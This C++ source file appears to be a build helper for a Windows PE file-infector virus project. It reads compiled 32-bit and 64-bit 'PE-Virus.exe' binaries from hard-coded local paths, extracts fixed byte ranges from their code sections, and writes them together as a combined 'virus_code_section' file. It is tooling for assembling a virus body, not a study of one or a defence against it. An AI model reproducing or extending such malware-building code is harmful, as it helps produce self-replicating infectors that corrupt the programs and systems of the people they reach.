#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>

using namespace std;

int main(int argc, char *argv[]) {

    string p32_path = "E:\\Code\\VS2022\\PE-Virus\\Release\\PE-Virus.exe";

    std::filesystem::path p32{p32_path};

    vector<unsigned char> v32(std::filesystem::file_size(p32));

    ifstream ifs32(p32_path, std::ios_base::binary);
    ifs32.read((char *)&v32[0], std::filesystem::file_size(p32));

    std::string p64_path = "E:\\Code\\VS2022\\PE-Virus\\x64\\Release\\PE-Virus.exe";
    std::filesystem::path p64{p64_path};

    vector<unsigned char> v64(std::filesystem::file_size(p64));

    ifstream ifs64(p64_path, std::ios_base::binary);
    ifs64.read((char *)&v64[0], std::filesystem::file_size(p64));

    vector<unsigned char> merge;

    std::copy (&v32[0x400], &v32[0x400 + 0x1e00], std::back_inserter(merge));
    std::copy (&v64[0x400], &v64[0x400 + 0x2400], std::back_inserter(merge));

    ofstream ofs("virusbody/virus_code_section", std::ios_base::binary);
    ofs.write((char *)&merge[0], merge.size());
}
